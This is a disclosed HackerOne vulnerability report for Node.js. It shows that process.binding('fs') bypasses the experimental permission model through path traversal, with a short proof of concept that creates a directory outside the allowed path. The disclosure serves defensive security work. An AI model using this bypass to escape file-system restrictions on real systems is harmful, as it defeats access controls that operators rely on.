# process.binding() can bypass the permission model through path traversal

## Report Details
- **Report ID**: 2051257
- **URL**: https://hackerone.com/reports/2051257
- **State**: Closed
- **Severity**: high
- **Submitted**: 2023-07-05T15:54:29.775Z
- **Disclosed**: 2023-09-10T15:26:16.937Z

## Reporter
- **Username**: rafaelgss
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
**Summary:** process.binding('fs') bypassed the permission model validation against path traversal

**Description:** process.binding('fs') can be used to bypass the path traversal validation for the permisison model

## Steps To Reproduce:

Create the following index.js and store at `/home/pathtraversal/`
```js
// index.js
const fs = process.binding('fs')

fs.mkdir('/home/pathtraversal/../test0', 511, false, null, null)
```

```console
$ pwd
/home/pathtraversal/
$ node --experimental-permission --allow-fs-read="/home/pathtraversal/*" --allow-fs-write="/home/pathtraversal/*" index.js
```

`/home/test0` will be created bypassing the permission model validation

## Impact

All the methods exposed by the process.binding('fs') could eventually bypass the permission model using path traversal. It will require the attacker to read the node_file.cc implementation, but that's trivial.

## Attachments
No attachments
